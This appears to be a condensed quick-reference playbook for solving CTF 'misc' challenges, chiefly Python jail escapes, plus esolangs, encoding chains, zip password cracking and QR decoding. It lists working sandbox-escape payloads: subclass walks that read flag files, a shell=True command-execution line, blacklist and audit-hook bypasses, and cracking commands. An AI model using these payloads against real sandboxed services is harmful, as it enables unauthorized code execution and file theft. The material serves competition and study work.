# misc-pyjail SUMMARY (quickref)

Classify first (60s local): `file`, `xxd|head`, `strings|grep flag{`,
  `exiftool`, `binwalk -E`, `unzip -l` / `7z l`, `zbarimg --raw`.
Route: `*.py` jail / `.bf`/whitespace/befunge / socket quiz / encoded blob
  / zip+password / QR-barcode image; else re-triage (stego/crypto/pwn).
Jail: read FULL source -> `jail.json` {entry, blacklist, builtins, hook}.
Benign ladder: `1+1` -> `().__class__` -> `''.__class__.__mro__`
  -> `__subclasses__()` (cap 15 probes, 2s gaps).
Read: `''.__class__.__mro__[1].__subclasses__()[INDEX]('flag.txt').read()`
  (discover INDEX locally first; never guess live twice).
RCE (gated): `...[INDEX]('cat flag*',shell=True).read()` — prefer read.
Bypass `_`/words: `getattr('', '__cla'+'ss__')`,
  `chr(95)+chr(95)+...`, `'__cl%s__'%'ass'`, `'{0.__class__}'.format('')`.
Audit hook: attribute-only walk; runtime-reconstruct names; no
  `__import__/eval/exec/open` literals on the wire.
Eval/exec/input: `7*7`->`49` proves sink; `str(open('flag.txt').read())`
  if repr-wrapped; short single payload if timeout<=5s.
Negatives (cap 10): plain `hello` control + blocked-word control +
  wrong-layer decode must fail + wrong-password `unzip -t` must fail.
Esolang: Hello-test local interp first (`bf.py`/befunge), then chall file;
  whitespace: `cat -A` to see ops; befunge: `"` string mode, `@` ends.
Socket: `timeout 8 nc -v $HOST $PORT` banner once; `solve.py`
  (socket+regex loop, 200 rounds max, 8s recv, 120s total, 2 reconnects).
Encoding (outer-first, verify each): `base64 -d` / `xxd -r -p` /
  `codecs.decode(s,'rot13')` / rot1-25 loop / vigenere+railfence<=200 keys.
Morse (`.-/`), bacon (a/b), hex, `rev`+b64 combos: try in magic order.
Archive: `fcrackzip -D -p rockyou.txt --use-unzip chal.zip` first;
  then `-b -c a1 -l 1-4` (120s); recurse nested depth<=5.
CRC: `zlib.crc32` check; brute only tiny known-plaintext (len<=4).
QR: `zbarimg --raw qr.png` -> `--quiet --raw` -> `--set test-inverted`
  -> `convert -negate` / `-resize 300%` -> pyzbar fallback; batch loop globs.
GATE: Phase 4 = ONE escape/chain, `timeout 120`. Then validate raw output,
  `grep -E -o` flag pattern, `flagpath.json`, no-payload causality check.
Script: `classify.py` (60s) / `jail_probe.py` (benign only) /
  `local_ladder.py` (INDEX discovery) / `chain.py` (6 layers max) /
  `crack_once.py` (dict then short brute) / `qr.py` (raw->negate->pyzbar).
Caps: P2<=15 probes, P3<=10, jail inputs total<=30, layers<=6, else blocked.
Stop: timeout kill, hook hard-block x2, 3 failed classifications -> handoff.
Hard jail: no-builtins = literal.__class__ walk + INDEX discovered locally
  on SAME minor; audit-hook open-block = reuse loaded module/file subclass,
  runtime-reconstruct names (concat/chr/format), no open/import literals.
Builtins ladders L1 direct -> L2 func-globals -> L3 subclass-globals ->
  L4 gc/frame (1 probe) -> L5 '{0.__class__}'.format(''); one rung/probe.
Evasion grammar: getattr-outer + chr/concat-inner + format/codec iff
  needed; ast.parse locally; cap 3 rung upgrades, then blocked.
Sandbox layer: chroot = read in-jail path only; ns/seccomp = ORW
  (open/read, no system/popen); ROP/io_uring ideas -> /pwn, not here.
Esolang loop: trivial Hello-test FIRST, then chall file, timeout 30;
  vary 1 semantic x3 max (cells/EOF/wrap) else /rev with variant matrix.
Custom-VM: count handlers + opcode histogram + tiny emu stub; >~32 ops
  or crypto/self-mod -> /rev with notes. Polyglot: unzip -l/7z l on image,
  extract trailing archive (depth<=5); script-text -> encode chain.
PoW: parse algo/prefix/target/charset -> solve_pow stub, 120s cap; then
  normal solve.py quiz loop. Oracle-game: bisect midpoint (log2 N),
  hot/cold gradient, exact-only small-space else blocked (200 rounds).
Chains: jail recon->ladder->read; zip crack->inner jail (fresh jail.json);
  encode-outer->esolang/VM-inner->grep; per-link verify or stop.
Failures: hook-open->stderr-channel; blind->timing 1char/round cap200;
  regex->rung+1; no-exec->ORW; esolang-garbage->fix interp; stall->rebase x1.
Versions: 3.8 vs 3.11+ audit-hook/except*/frame drift; match minor
  locally; convert vs magick fallback; pin versions in flagpath.json.
Tiers: easy<=10m / med<=30m / hard<=90m / insane=escalate; jail<=30 in,
  layers<=6, rounds<=200, 1 retry + 1 alternate then blocked.
Escalate: /rev (VM/crypto-handlers, F5 x3 fail) /crypto (3+ keyed layers)
  /operator (service down, out-of-root path, unbounded brute).
Example: 7*7->49 + class-tuple + filter-word probe; local INDEX + dummy
  read + ast.parse; ONE str()-wrapped read shot; grep format; causality.
Technique-only; `$HOST/$PORT` placeholders; never paste live flags.
Writeup-distilled (W1-W36): help-prompt module load -> code.InteractiveConsole
  / pdb.set_trace via sys.modules; unicode-ident + FULLWIDTH `_`; Helper-doc
  char synthesis; `%c`-format word build; match-case attr grab; getitem-trampoline
  calls (`Cls[ARG]`), spaceless `[[]for[a]in[[b]]]`, decorator+CR chains;
  single-dot lambda-getter; prime/collatz word shaping; popitem-last grab;
  signal-frame hook mute (closure cell_contents) / ctypes head-NULL / fork_exec
  / loader.load_module; LOAD_FAST-OOB + BUILTIN-call bytecode; pickle
  BUILD->persistent_load/stdout.write/`_Printer__setup` + `__main__`-overlay;
  div-zero/OOB blind oracle; stderr-splat exfil; PoW nonce-reuse+array-amplify;
  QR-shuffle/finder-repair; CRC-plaintext + 1-byte zip ladders.
R2 (W37-W66): monitoring-rebind/`enum.sys`/repr-after-neuter/117->106/pickle-smuggle/operator-overwrite/stderr-exit-panic/asm-dc-budget-grammars; scanner-NEWOBJ/pickle-triple/BINBYTES-confusion; JS-proxy+vm2/Lua-chunk/Ruby-Perl-OCaml/JVM-EL+Deno-Bun-Emacs/PHP-LD_PRELOAD; regex-cache+matcher/DFA-build; git-patch+submodule+checkout-confusion; proc-mem+memfd+core_pattern; eBPF-verifier-lie; chess-null-UCI/client-trust; minesweeper-linearize/RNG-clone; CRC-collide; rule-bot-render+pollute; suffix-PoW+quiz-loops; QR-RS+polyglot-gzip; bkcrack-Deflate-matrix; bf-JIT-OOB+dialect-golf; format-address+redaction-measure; arcade-state+official-solve-first.
